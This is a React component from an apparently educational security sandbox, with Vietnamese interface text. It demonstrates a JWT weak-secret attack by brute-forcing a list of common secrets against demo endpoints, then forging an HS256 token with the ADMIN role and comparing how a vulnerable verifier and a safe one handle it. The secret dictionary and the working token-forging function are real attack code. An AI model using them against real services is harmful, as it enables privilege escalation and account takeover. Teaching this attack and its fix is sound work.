'use client';
// features/security-sandbox/components/test-panels/brute-secret-key-panel.tsx

import { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Alert, AlertDescription } from '@/components/ui/alert';
import { toast } from 'sonner';

const COMMON_SECRETS = [
  'password', 'secret123', '1234', 'jwt-secret', 'mysecret',
  'abc123', 'secret', 'changeme', 'key', 'token', 'auth-secret',
  'your-256-bit-secret', 'supersecret', 'default',
];

// Web Crypto API to forge a valid standard HMAC-SHA256 JWT
async function forgeRealJWT(secret: string, email: string, role: string): Promise<string> {
  const header = { alg: 'HS256', typ: 'JWT' };
  const payload = {
    sub: email,
    type: 'access',
    role: role,
    iat: Math.floor(Date.now() / 1000),
    exp: Math.floor(Date.now() / 1000) + 3600
  };

  const base64UrlEncode = (obj: any) => {
    const str = JSON.stringify(obj);
    const bytes = new TextEncoder().encode(str);
    const binString = Array.from(bytes, (byte) => String.fromCharCode(byte)).join('');
    return btoa(binString).replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
  };

  const headerEncoded = base64UrlEncode(header);
  const payloadEncoded = base64UrlEncode(payload);
  const dataToSign = `${headerEncoded}.${payloadEncoded}`;

  const enc = new TextEncoder();
  const keyData = enc.encode(secret);
  const key = await window.crypto.subtle.importKey(
    'raw',
    keyData,
    { name: 'HMAC', hash: 'SHA-256' },
    false,
    ['sign']
  );
  
  const signatureBuffer = await window.crypto.subtle.sign(
    'HMAC',
    key,
    enc.encode(dataToSign)
  );

  const signatureBytes = new Uint8Array(signatureBuffer);
  const binSigString = Array.from(signatureBytes, (byte) => String.fromCharCode(byte)).join('');
  const signatureEncoded = btoa(binSigString)
    .replace(/=/g, '')
    .replace(/\+/g, '-')
    .replace(/\//g, '_');

  return `${dataToSign}.${signatureEncoded}`;
}

export function BruteSecretKeyPanel() {
  const [running, setRunning] = useState(false);
  const [logs, setLogs] = useState<{ secret: string; success: boolean }[]>([]);
  const [found, setFound] = useState<string | null>(null);
  const [forgedToken, setForgedToken] = useState<string | null>(null);
  const [speed, setSpeed] = useState(200); // ms per attempt
  const [verifyResult, setVerifyResult] = useState<{
    vulnSuccess: boolean;
    vulnMsg: string;
    vulnData: any;
    fixedSuccess: boolean;
    fixedMsg: string;
  } | null>(null);

  const start = () => {
    setRunning(true);
    setLogs([]);
    setFound(null);
    setForgedToken(null);
    setVerifyResult(null);

    let i = 0;
    const interval = setInterval(async () => {
      if (i >= COMMON_SECRETS.length) {
        clearInterval(interval);
        setRunning(false);
        toast.error('Không tìm thấy secret key trong từ điển!');
        return;
      }

      const secret = COMMON_SECRETS[i];
      try {
        const formData = new FormData();
        formData.append('secret', secret);
        const res = await fetch('/api/v1/demo/access/jwt/brute', {
          method: 'POST',
          body: formData,
        });
        const data = await res.json();

        setLogs((prev) => [...prev, { secret, success: data.success }]);

        if (data.success) {
          clearInterval(interval);
          setRunning(false);
          setFound(secret);
          toast.success(`Đã phát hiện Secret Key: "${secret}"!`);
          
          // Forge real JWT token signed with "secret"
          const token = await forgeRealJWT(secret, 'admin@tutornet.vn', 'ADMIN');
          setForgedToken(token);
        }
      } catch (e) {
        // Ignored
      }
      i++;
    }, speed);
  };

  const testForgedToken = async () => {
    if (!forgedToken) return;
    try {
      const formData = new FormData();
      formData.append('token', forgedToken);

      // 1. Verify Vulnerable
      const resVuln = await fetch('/api/v1/demo/access/jwt/verify/vulnerable', {
        method: 'POST',
        body: formData,
      });
      const dataVuln = await resVuln.json();

      // 2. Verify Safe
      const resFixed = await fetch('/api/v1/demo/access/jwt/verify/safe', {
        method: 'POST',
        body: formData,
      });
      const dataFixed = await resFixed.json();

      setVerifyResult({
        vulnSuccess: dataVuln.verified || false,
        vulnMsg: dataVuln.message || 'Xác thực thất bại',
        vulnData: dataVuln.data || null,
        fixedSuccess: dataFixed.verified || false,
        fixedMsg: dataFixed.message || 'Chữ ký không hợp lệ',
      });
    } catch (e) {
      toast.error('Lỗi khi test forged token');
    }
  };

  const reset = () => {
    setLogs([]);
    setFound(null);
    setForgedToken(null);
    setRunning(false);
    setVerifyResult(null);
  };

  return (
    <div className="space-y-4">
      <Alert className="border-amber-500/30 bg-amber-500/5 dark:border-amber-500/40 dark:bg-amber-500/10">
        <AlertDescription className="text-amber-800 dark:text-amber-300 text-xs">
          <strong>Kiểm thử JWT Weak Secret (Khóa bí mật JWT yếu):</strong> Nếu server sử dụng một khóa bí mật yếu và dễ đoán (như <code>"secret"</code>), kẻ tấn công có thể chạy brute-force ngoại tuyến hoặc trực tuyến để dò ra khóa. Sau đó, họ ký giả mạo (forge) một token bất kỳ (như nâng quyền lên <code>ADMIN</code>) để xâm nhập hệ thống.
        </AlertDescription>
      </Alert>

      <div className="space-y-2">
        <p className="text-xs text-muted-foreground font-medium">Tốc độ Brute Force:</p>
        <div className="flex gap-2">
          {[{ label: 'Chậm', ms: 400 }, { label: 'Trung bình', ms: 200 }, { label: 'Nhanh', ms: 60 }].map((s) => (
            <button
              key={s.ms}
              onClick={() => setSpeed(s.ms)}
              disabled={running}
              className={`rounded border px-3 py-1 text-xs transition-all ${
                speed === s.ms ? 'border-primary bg-primary/20 text-primary' : 'border-border/30 hover:bg-muted/20 text-muted-foreground'
              }`}
            >
              {s.label}
            </button>
          ))}
        </div>
      </div>

      <div className="flex gap-2">
        <Button size="sm" onClick={start} variant="destructive" disabled={running}>
          {running ? 'Đang brute-force...' : 'Bắt đầu brute force'}
        </Button>
        {(logs.length > 0 || found) && !running && (
          <Button size="sm" onClick={reset} variant="outline">Reset</Button>
        )}
      </div>

      {logs.length > 0 && (
        <div className="rounded border border-border/20 bg-black/40 p-3 max-h-40 overflow-y-auto space-y-1">
          {logs.map((log, i) => (
            <div key={i} className="flex items-center gap-2 text-xs font-mono">
              <span className={log.success ? 'text-green-400' : 'text-muted-foreground'}>
                {log.success ? '✅' : '❌'}
              </span>
              <code className={log.success ? 'text-green-400 font-bold' : 'text-muted-foreground'}>
                Thử khóa: "{log.secret}"
              </code>
              {log.success && <span className="text-green-400 font-semibold">← ĐÃ PHÁT HIỆN KHÓA YẾU!</span>}
            </div>
          ))}
          {running && (
            <div className="flex items-center gap-2 text-xs">
              <span className="animate-pulse text-yellow-400">●</span>
              <span className="text-muted-foreground text-[10px]">Đang quét tiếp từ điển...</span>
            </div>
          )}
        </div>
      )}

      {found && forgedToken && (
        <div className="rounded border border-red-500/40 bg-red-950/10 p-4 space-y-3 animate-in fade-in duration-200">
          <p className="text-red-400 font-semibold text-xs">
            🔴 Dò tìm thành công! Khóa bí mật JWT của Server là: <code className="text-red-300 text-sm font-bold">"{found}"</code>
          </p>
          <div className="space-y-1">
            <p className="text-xs text-muted-foreground">Forged JWT Token được tạo tự động (sub=admin@tutornet.vn, role=ADMIN):</p>
            <div className="rounded bg-black/60 p-3">
              <code className="text-xs text-red-300 break-all font-mono">{forgedToken}</code>
            </div>
          </div>
          
          <div className="flex gap-2">
            <Button size="sm" onClick={testForgedToken} className="bg-red-600 hover:bg-red-700 text-xs">
              Kiểm thử Token giả mạo trên Server
            </Button>
          </div>

          {verifyResult && (
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mt-2 border-t border-red-500/20 pt-3 animate-in slide-in-from-bottom-2 duration-200">
              {/* Vuln Result */}
              <div className={`p-3 rounded border text-xs space-y-1.5 ${verifyResult.vulnSuccess ? 'border-red-500/30 bg-red-950/10' : 'border-green-500/20'}`}>
                <p className="font-bold text-red-400">🔴 Vulnerable Endpoint (Xác thực khóa yếu)</p>
                <p className="text-[11px] text-red-200 font-medium">{verifyResult.vulnMsg}</p>
                {verifyResult.vulnData && (
                  <pre className="text-[10px] font-mono bg-black/45 p-2 rounded text-red-300 max-h-24 overflow-y-auto">
                    {JSON.stringify(verifyResult.vulnData, null, 2)}
                  </pre>
                )}
              </div>

              {/* Safe Result */}
              <div className={`p-3 rounded border text-xs space-y-1.5 ${verifyResult.fixedSuccess ? 'border-red-500/30 bg-red-950/10' : 'border-green-500/30 bg-green-950/5'}`}>
                <p className="font-bold text-green-400">✅ Safe Endpoint (Xác thực khóa mạnh)</p>
                <p className="text-[11px] text-green-300 font-semibold">{verifyResult.fixedMsg}</p>
              </div>
            </div>
          )}
        </div>
      )}

      <div className="text-xs bg-muted/30 rounded p-3 font-mono space-y-1">
        <p className="text-red-400 font-semibold">Vulnerable (Secret key dễ đoán):</p>
        <code className="text-muted-foreground">{'Jwts.builder().signWith(Keys.hmacShaKeyFor("secret".getBytes()))'}</code>
        <p className="text-green-400 font-semibold mt-2">Fixed (Khóa bí mật mạnh 256-bit tạo ngẫu nhiên bảo mật):</p>
        <code className="text-muted-foreground">
          {'Jwts.builder().signWith(Keys.hmacShaKeyFor(strongSecretFromEnv.getBytes()))'}
        </code>
      </div>
    </div>
  );
}
